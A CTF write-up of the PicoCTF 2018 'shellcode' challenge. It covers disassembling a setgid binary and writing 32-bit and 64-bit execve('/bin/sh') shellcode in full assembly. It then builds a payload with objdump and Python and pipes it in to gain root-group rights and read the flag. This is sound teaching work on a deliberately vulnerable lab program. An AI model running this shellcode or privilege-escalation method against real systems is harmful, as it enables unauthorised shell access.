# Write-up for shellcode challenge
# PicoCTF_2018: shellcode

**Category:** Binary Exploitation
**Points:** 200
>This program executes any input you give it. Can you get a shell? 
You can find the program in /problems/shellcode_1_cec2eb801137d645a9f15b9b6af5347a on the shell server. Source.

> # Introduction

In this write-up I am going to demostrate how to gain shell access by exploiting this vulnerable program.
I shall show it in both 32bit and 64bit systems and you'll see the main differences.

> # Prerequisites:

You need to have some basic knowledge about C, gcc, linux command line, linux file permissions and x86 assembly. 

> # Scenario:

We have access to a system with an executable binary and a txt file containing the flag. The txt file is owned by a group 
that we are not members, so we don't have access. However, the executable binary is owned from tha same group and it has the sgid bit set. If we exploit it
and gain shell access we will grant privileges. As a result, we will be capable of reading the flag.txt to find the solution.
More about linux file permissions[here](https://www.geeksforgeeks.org/permissions-in-linux/)and sgid [here](https://www.geeksforgeeks.org/setuid-setgid-and-sticky-bits-in-linux-file-permissions/) 

> # Setting up the environment:
First of all you need to download the executable and the flag from my git repository [here](https://github.com/giannoulispanagiotis/picoCTF-2018-wiretup/tree/master/shellcode).

Now we need to set up the permissions for both of the files to create the right scenario.

1. For the executable file vuln:

```bash
[sudo] chmod +x vuln
[sudo] chown root:root vuln
[sudo] chmod g+s vuln
```


2. For the flag file
```bash
[sudo] chown root:root flag.txt
[sudo] chmod 440 flag.txt 
```
Confirm by listing the file with ls -l vuln flag.txt. The result have to be something like that:

```
-r--r----- 1 root root 35 Oct 5 00:27 flag.txt
-rwxr-sr-x root root 725472 Oct 5 00:23 vuln
```

As you can see flag's and vuln's group ownership is root. But our user is not in root's group unfortunately. flag.txt is readable only from owner(root) and the members of the group's ownership(root again). But in vuln's file permissions we notice two things. First, group's ownership is also root and vuln has the sgid bit set. Which means that if we gain shell access from this executable our group id  will be root (0). I'll make it clear with screenshots soon. 

Okay now let's get to some nice stuff.
> # Shellcode Injection
We need to understand how the vuln program works. For this purpose we will make use of gdb to disassemble the program and find what it does.
This is how it looks like. (It may not be exactly the same in your case)

![Screenshot from 2019-10-10 00-21-21](https://user-images.githubusercontent.com/37578272/66527168-c855b480-eb03-11e9-820d-131d4dcb2d31.png)

![Screenshot from 2019-10-10 00-21-07](https://user-images.githubusercontent.com/37578272/66527193-df94a200-eb03-11e9-8671-4a4ab67761b0.png)

Nice, we see that the compiled binary is 32bit.
Inside the two functions (main and vuln) we need to focus on two points.
In the vuln function we see gets being called (which is vulnerable because doesn't check the size of our input, so we can overflow the buffer, but we don't need it in this challenge, it's much easier), so binary waits for input from stdin. Moreover, in the main function we can see the vulnerability we will exploit. **<main + 124>: call eax**
We want to find what it is inside register eax before we call it so we set a breakpoint before this instruction. Going down there we realize that in eax register is the address of the stack where our input is saved. So when program calls eax, tells processor to go to this address and execute the instructions that will find there. Thus we understand that if we put in the right input (a shellcode) we can easily gain access. And .... let's go write this shellcode anyway.

![Screenshot from 2019-10-10 02-24-33](https://user-images.githubusercontent.com/37578272/66527509-2a62e980-eb05-11e9-976e-cd4c87757ff9.png)

> # Crafting Shellcode
I will try to explain it in brief. First create shellcode.asm with the following code:
(Remember, memory is upside down, so when we want to push in the stack a string e.g. /bin/sh\0 we have to do it like that:

push \0 (null)

push //sh in hex

push /bin in hex

In 32 bit systems,  a memory block has a 4 bytes size, so we split our string. We also use 2 '//' so that we cover the whole block(4 bytes - '/sh' is 3 bytes), otherwise there will be something else in the 4th byte that we don't want to. /bin/sh and /bin//sh have no difference.

```asm
xor eax, eax     ; clearing eax register
push eax         ; Pushing NULL bytes (\0)
push 0x68732f2f  ; Pushing //sh
push 0x6e69622f  ; Pushing /bin
mov ebx, esp     ; ebx has address of /bin//sh
push eax         ; Pushing NULL byte (for argv array)
mov edx, esp     ; edx now has address of NULL byte
push ebx         ; pushing address of /bin//sh
mov ecx, esp     ; ecx now has address of address of /bin//sh 
mov al, 0xb      ; syscall number of execve is 11
int 0x80         ; system call
```

We call the execve function to get a shell.
In 32bit systems arguments of a function go in that way: eax, ebx, ecx, edx
Our function is:
```C
 int execve(const char *filename, char *const argv [], char *const envp[]);
```

This means we're passing the following:

> eax // Syscall of execve == 11 == 0xb

> ebx // Arg#1: pointer to the program string ("/bin//sh")

> ecx // Arg#2: pointer to the arguments array

*(argv[0] = "/bin//sh" , argv[1] = NULL)*

> edx // Arg#3: pointer to the environment array (NULL)

To compile it use nasm:

```bash
nasm -f elf shellcode.asm
```

Now we want to get the shellcode bytes in hex format.
If we use objdump -d shellcode.o the result is our assembly code and the hexadecimal format of it. To keep only the hex code we can use this command:
```bash
for i in $(objdump -d shellcode.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo;
```
*grep* is used to keep only lines with a space in the beginning. *cut -f2*  keeps the second column and with *echo* we print it in the format we want. 

After all, we almost have our input ready to pass it in our program. 

> # Crafting Payload
We need to understand that if we write as input something like: \x50\x35\x54\x73, in the stack will be this string converted into hex which is exactly the same when our input is: hello_world. That's something we don't want to. Python help us with that and prints our hex code in a string using ascii table.

```python
python -c 'print "--hex values here--"' >  payload
```
Now in the payload we have our input. We run vuln with input from payload

```bash
./vuln < payload
```
Congrats, or not? wait what the fuu?
We didn't get access to the shell. Ohh maybe we did something wrong in our shellcode...
No, basically we got access to the shell, but then, our program doesn't wait for some input and it terminates and we lose our access. We need a magic trick to overcome this problem.

*cat* command without arguments is doing exactly what we want, waits for input. Sooo what do you say about that:
```bash
(cat payload; cat) | ./vuln
```

```bash
cat flag.txt
```
Congrats, we got our flag.
Why can we now read flag.txt?
Using *id* command we notice that user is the same as before, but now we belong to root group. (sgid you are so dangerous my friend). And flag.txt allow to members of root group to read the file. Genious...

![Screenshot from 2019-10-10 02-19-42](https://user-images.githubusercontent.com/37578272/66527375-a4df3980-eb04-11e9-85a0-e0c600d83674.png)


Before we get to 64bit systems let's write a shell script( I like doing that everytime, it's like a sum up)
```bash
nasm -f elf shellcode.asm

python -c "print '`(for i in $(objdump -d shellcode.o | grep "^ " | cut -f2); do echo -n '\x'$i; done;)`'"  > payload;

(cat payload; cat) | ./vuln
```
> # 64bit systems
Now let's play with 64bit systems. It's not that difficult, the only thing that changes is the shellcode. Now we need to download the source code and compile it to take the 64bit binary.
You can download the program from [here](https://2018shell.picoctf.com/static/77b3483ed4e56701fa7db9c5bdea4d03/vuln.c).
Compile it:
```bash
gcc -o vuln vuln.c -fno-stack-protector -z execstack
```

I don't thing we need to examine again assembly code of vuln. It's pretty much the same, of course registers are different and some instructions too but the bigger picture (that we want to focus on in this challenge) is the same.

I will jump to the shellcode:

```asm
section .text
            global _start
 
    _start:
            xor     rdx, rdx                ; clearing rdx register 
            mov     qword rbx, '//bin/sh'   ; pushing //bin/sh to rbx register
            shr     rbx, 0x8                ; shift right 8 times rbx register (I'll explain it below)
            push    rbx                     ; push /bin/sh in stack
            mov     rdi, rsp                ; rdi now has address of /bin/sh
            push    rax                     ; pushing NULL byte
            push    rdi                     ; pushing address of /bin/sh
            mov     rsi, rsp                ; rsi has now address of address of /bin/sh
            mov     al, 0x3b                ; syscall number of execve is 59 in 64bit systems
            syscall                         ; system call
```
As expected we call the execve function to get a shell.
In 64bit systems arguments of a function go in that way: rdi, rsi, rdx, rcx (and syscall number goes to rax)
Our function is:
```C
 int execve(const char *filename, char *const argv [], char *const envp[]);
```

This means we're passing the following:

> rax // Syscall of execve == 59 == 0x3b

> rdi // Arg#1: pointer to the program string ("/bin/sh")

> rsi // Arg#2: pointer to the arguments array

*(argv[0] = "/bin//sh" , argv[1] = NULL)*

> rdx // Arg#3: pointer to the environment array (NULL)

Something that may seem confusing is the sift right in rbx register. With this instruction we just throw away the first '/'. When we push rbx in the stack, instead of this slash we have a null byte in the end of the string.
By the way it's a good time here to search about little and big endian.

To compile it use nasm:

```bash
nasm -f elf64 shellcode.asm
```

Again we use objdump to get the hex values.

```bash
for i in $(objdump -d shellcode.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo;
```
Finally, we create the payload with python:
```python
python -c 'print "--hex values here--"' >  payload
```
```bash
(cat payload; cat) | ./vuln
```

```bash
cat flag.txt
```
Congrats, we got our flag.
